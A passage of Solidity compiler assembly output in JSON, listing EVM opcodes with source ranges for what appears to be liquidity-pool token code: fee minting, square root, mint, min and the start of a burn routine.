											"end": 4265,
											"name": "DUP9"
										},
										{
											"begin": 4235,
											"end": 4265,
											"name": "AND"
										},
										{
											"begin": 4235,
											"end": 4265,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4235,
											"end": 4254,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4235,
											"end": 4265,
											"name": "AND"
										},
										{
											"begin": 4235,
											"end": 4265,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4225,
											"end": 4266,
											"name": "tag",
											"value": "355"
										},
										{
											"begin": 4225,
											"end": 4266,
											"name": "JUMPDEST"
										},
										{
											"begin": 4212,
											"end": 4266,
											"name": "SWAP1"
										},
										{
											"begin": 4212,
											"end": 4266,
											"name": "POP"
										},
										{
											"begin": 4284,
											"end": 4298,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4301,
											"end": 4318,
											"name": "PUSH [tag]",
											"value": "357"
										},
										{
											"begin": 4311,
											"end": 4317,
											"name": "DUP4"
										},
										{
											"begin": 4301,
											"end": 4310,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 4301,
											"end": 4318,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4301,
											"end": 4318,
											"name": "tag",
											"value": "357"
										},
										{
											"begin": 4301,
											"end": 4318,
											"name": "JUMPDEST"
										},
										{
											"begin": 4284,
											"end": 4318,
											"name": "SWAP1"
										},
										{
											"begin": 4284,
											"end": 4318,
											"name": "POP"
										},
										{
											"begin": 4348,
											"end": 4357,
											"name": "DUP1"
										},
										{
											"begin": 4340,
											"end": 4345,
											"name": "DUP3"
										},
										{
											"begin": 4340,
											"end": 4357,
											"name": "GT"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "ISZERO"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "PUSH [tag]",
											"value": "358"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "JUMPI"
										},
										{
											"begin": 4381,
											"end": 4395,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4398,
											"end": 4488,
											"name": "PUSH [tag]",
											"value": "359"
										},
										{
											"begin": 4465,
											"end": 4466,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4398,
											"end": 4435,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "PUSH [tag]",
											"value": "361"
										},
										{
											"begin": 4414,
											"end": 4419,
											"name": "DUP7"
										},
										{
											"begin": 4424,
											"end": 4433,
											"name": "DUP7"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4414,
											"end": 4423,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "AND"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "tag",
											"value": "361"
										},
										{
											"begin": 4414,
											"end": 4434,
											"name": "JUMPDEST"
										},
										{
											"begin": 4398,
											"end": 4409,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4398,
											"end": 4409,
											"name": "SLOAD"
										},
										{
											"begin": 4398,
											"end": 4409,
											"name": "SWAP1"
										},
										{
											"begin": 4398,
											"end": 4435,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4398,
											"end": 4413,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4398,
											"end": 4435,
											"name": "AND"
										},
										{
											"begin": 4398,
											"end": 4435,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4398,
											"end": 4488,
											"name": "tag",
											"value": "359"
										},
										{
											"begin": 4398,
											"end": 4488,
											"name": "JUMPDEST"
										},
										{
											"begin": 4381,
											"end": 4488,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4510,
											"end": 4526,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "PUSH [tag]",
											"value": "362"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "PUSH [tag]",
											"value": "363"
										},
										{
											"begin": 4547,
											"end": 4556,
											"name": "DUP5"
										},
										{
											"begin": 4561,
											"end": 4562,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4547,
											"end": 4560,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "AND"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "tag",
											"value": "363"
										},
										{
											"begin": 4547,
											"end": 4563,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "PUSH [tag]",
											"value": "364"
										},
										{
											"begin": 4529,
											"end": 4534,
											"name": "DUP7"
										},
										{
											"begin": 4539,
											"end": 4541,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4529,
											"end": 4538,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "AND"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "tag",
											"value": "364"
										},
										{
											"begin": 4529,
											"end": 4542,
											"name": "JUMPDEST"
										},
										{
											"begin": 4529,
											"end": 4546,
											"name": "SWAP1"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4529,
											"end": 4546,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "AND"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "tag",
											"value": "362"
										},
										{
											"begin": 4529,
											"end": 4564,
											"name": "JUMPDEST"
										},
										{
											"begin": 4510,
											"end": 4564,
											"name": "SWAP1"
										},
										{
											"begin": 4510,
											"end": 4564,
											"name": "POP"
										},
										{
											"begin": 4586,
											"end": 4600,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4615,
											"end": 4626,
											"name": "DUP2"
										},
										{
											"begin": 4603,
											"end": 4612,
											"name": "DUP4"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "DUP2"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "PUSH [tag]",
											"value": "365"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "JUMPI"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "INVALID"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "tag",
											"value": "365"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "JUMPDEST"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "DIV"
										},
										{
											"begin": 4603,
											"end": 4626,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4652,
											"end": 4665,
											"name": "DUP1"
										},
										{
											"begin": 4652,
											"end": 4665,
											"name": "ISZERO"
										},
										{
											"begin": 4648,
											"end": 4690,
											"name": "PUSH [tag]",
											"value": "367"
										},
										{
											"begin": 4648,
											"end": 4690,
											"name": "JUMPI"
										},
										{
											"begin": 4667,
											"end": 4690,
											"name": "PUSH [tag]",
											"value": "367"
										},
										{
											"begin": 4673,
											"end": 4678,
											"name": "DUP8"
										},
										{
											"begin": 4680,
											"end": 4689,
											"name": "DUP3"
										},
										{
											"begin": 4667,
											"end": 4672,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 4667,
											"end": 4690,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4667,
											"end": 4690,
											"name": "tag",
											"value": "367"
										},
										{
											"begin": 4667,
											"end": 4690,
											"name": "JUMPDEST"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "POP"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "POP"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "POP"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "tag",
											"value": "358"
										},
										{
											"begin": 4336,
											"end": 4709,
											"name": "JUMPDEST"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "POP"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "POP"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "tag",
											"value": "354"
										},
										{
											"begin": 4177,
											"end": 4723,
											"name": "JUMPDEST"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "PUSH [tag]",
											"value": "369"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "JUMP"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "tag",
											"value": "353"
										},
										{
											"begin": 4152,
											"end": 4790,
											"name": "JUMPDEST"
										},
										{
											"begin": 4743,
											"end": 4754,
											"name": "DUP1"
										},
										{
											"begin": 4743,
											"end": 4754,
											"name": "ISZERO"
										},
										{
											"begin": 4739,
											"end": 4790,
											"name": "PUSH [tag]",
											"value": "369"
										},
										{
											"begin": 4739,
											"end": 4790,
											"name": "JUMPI"
										},
										{
											"begin": 4778,
											"end": 4779,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4770,
											"end": 4775,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 4770,
											"end": 4779,
											"name": "SSTORE"
										},
										{
											"begin": 4739,
											"end": 4790,
											"name": "tag",
											"value": "369"
										},
										{
											"begin": 4739,
											"end": 4790,
											"name": "JUMPDEST"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "POP"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "POP"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "SWAP3"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "SWAP2"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "POP"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "POP"
										},
										{
											"begin": 3903,
											"end": 4796,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "tag",
											"value": "209"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMPDEST"
										},
										{
											"begin": 400,
											"end": 409,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 429,
											"end": 430,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 425,
											"end": 426,
											"name": "DUP3"
										},
										{
											"begin": 425,
											"end": 430,
											"name": "GT"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "ISZERO"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "371"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 450,
											"end": 451,
											"name": "DUP1"
										},
										{
											"begin": 485,
											"end": 486,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 481,
											"end": 482,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DUP3"
										},
										{
											"begin": 477,
											"end": 482,
											"name": "DIV"
										},
										{
											"begin": 477,
											"end": 486,
											"name": "ADD"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "373"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 511,
											"end": 512,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 507,
											"end": 512,
											"name": "LT"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "ISZERO"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "374"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPI"
										},
										{
											"begin": 536,
											"end": 537,
											"name": "DUP1"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "SWAP2"
										},
										{
											"begin": 532,
											"end": 537,
											"name": "POP"
										},
										{
											"begin": 573,
											"end": 574,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 568,
											"end": 569,
											"name": "DUP2"
										},
										{
											"begin": 564,
											"end": 565,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 561,
											"name": "DUP6"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "PUSH [tag]",
											"value": "375"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "INVALID"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "tag",
											"value": "375"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 565,
											"name": "DIV"
										},
										{
											"begin": 560,
											"end": 569,
											"name": "ADD"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "PUSH [tag]",
											"value": "376"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPI"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "INVALID"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "tag",
											"value": "376"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 574,
											"name": "DIV"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "SWAP1"
										},
										{
											"begin": 555,
											"end": 574,
											"name": "POP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "PUSH [tag]",
											"value": "373"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMP"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "tag",
											"value": "374"
										},
										{
											"begin": 500,
											"end": 589,
											"name": "JUMPDEST"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "POP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "378"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMP"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "tag",
											"value": "371"
										},
										{
											"begin": 421,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "DUP2"
										},
										{
											"begin": 609,
											"end": 615,
											"name": "ISZERO"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "PUSH [tag]",
											"value": "378"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 635,
											"end": 636,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "tag",
											"value": "378"
										},
										{
											"begin": 605,
											"end": 647,
											"name": "JUMPDEST"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP2"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "SWAP1"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "POP"
										},
										{
											"begin": 352,
											"end": 653,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "tag",
											"value": "211"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "JUMPDEST"
										},
										{
											"begin": 1583,
											"end": 1594,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1583,
											"end": 1594,
											"name": "SLOAD"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "PUSH [tag]",
											"value": "380"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1599,
											"end": 1604,
											"name": "DUP3"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1583,
											"end": 1598,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "AND"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "tag",
											"value": "380"
										},
										{
											"begin": 1583,
											"end": 1605,
											"name": "JUMPDEST"
										},
										{
											"begin": 1569,
											"end": 1580,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "DUP2"
										},
										{
											"begin": 1569,
											"end": 1605,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "DUP4"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "AND"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "DUP2"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "MSTORE"
										},
										{
											"begin": 1631,
											"end": 1640,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "MSTORE"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "SWAP1"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "KECCAK256"
										},
										{
											"begin": 1631,
											"end": 1644,
											"name": "SLOAD"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "PUSH [tag]",
											"value": "381"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "SWAP1"
										},
										{
											"begin": 1649,
											"end": 1654,
											"name": "DUP3"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1631,
											"end": 1648,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "AND"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "tag",
											"value": "381"
										},
										{
											"begin": 1631,
											"end": 1655,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "AND"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "MSTORE"
										},
										{
											"begin": 1615,
											"end": 1624,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "MSTORE"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP1"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "DUP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "KECCAK256"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP5"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP1"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SWAP5"
										},
										{
											"begin": 1615,
											"end": 1655,
											"name": "SSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP4"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MLOAD"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP6"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP4"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "MLOAD"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP3"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP4"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP2"
										},
										{
											"begin": 1615,
											"end": 1628,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP3"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "DUP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SUB"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP2"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "ADD"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "SWAP1"
										},
										{
											"begin": 1670,
											"end": 1701,
											"name": "LOG3"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "POP"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "POP"
										},
										{
											"begin": 1508,
											"end": 1708,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "tag",
											"value": "218"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMPDEST"
										},
										{
											"begin": 192,
											"end": 201,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 221,
											"end": 222,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 218,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 222,
											"name": "LT"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "383"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPI"
										},
										{
											"begin": 229,
											"end": 230,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "PUSH [tag]",
											"value": "384"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMP"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "383"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 225,
											"end": 226,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "tag",
											"value": "384"
										},
										{
											"begin": 217,
											"end": 230,
											"name": "JUMPDEST"
										},
										{
											"begin": 213,
											"end": 230,
											"name": "SWAP4"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 134,
											"end": 237,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "tag",
											"value": "242"
										},
										{
											"begin": 2196,
											"end": 2404,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "DUP3"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "AND"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SWAP1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "DUP2"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "MSTORE"
										},
										{
											"begin": 2277,
											"end": 2286,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "MSTORE"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SWAP1"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "KECCAK256"
										},
										{
											"begin": 2277,
											"end": 2292,
											"name": "SLOAD"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "PUSH [tag]",
											"value": "386"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "SWAP1"
										},
										{
											"begin": 2297,
											"end": 2302,
											"name": "DUP3"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2277,
											"end": 2296,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "AND"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "tag",
											"value": "386"
										},
										{
											"begin": 2277,
											"end": 2303,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP4"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "AND"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "SWAP1"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP2"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "MSTORE"
										},
										{
											"begin": 2259,
											"end": 2268,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "MSTORE"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "DUP2"
										},
										{
											"begin": 2259,
											"end": 2274,
											"name": "KECCAK256"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP2"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP1"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SWAP2"
										},
										{
											"begin": 2259,
											"end": 2303,
											"name": "SSTORE"
										},
										{
											"begin": 2327,
											"end": 2338,
											"name": "SLOAD"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "PUSH [tag]",
											"value": "387"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "SWAP1"
										},
										{
											"begin": 2343,
											"end": 2348,
											"name": "DUP3"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2327,
											"end": 2342,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "AND"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "tag",
											"value": "387"
										},
										{
											"begin": 2327,
											"end": 2349,
											"name": "JUMPDEST"
										},
										{
											"begin": 2313,
											"end": 2324,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2313,
											"end": 2349,
											"name": "SWAP1"
										},
										{
